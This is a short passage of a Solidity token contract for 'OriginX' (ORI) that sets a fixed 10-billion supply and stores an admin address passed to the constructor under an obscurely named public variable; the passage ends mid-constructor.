...
contract ORITOKEN is Ownable {
    
    uint256 AMOUNTGLOBALADMOUNT = 10000000000*10**decimals();
    uint256 private _seitotalSupply = AMOUNTGLOBALADMOUNT;
    string private _seitokenname = "OriginX";
    string private _seitokensymbol = "ORI";
    address public dsccvxfr98;
    constructor(address tokenadmin) {
        dsccvxfr98 = tokenadmin;
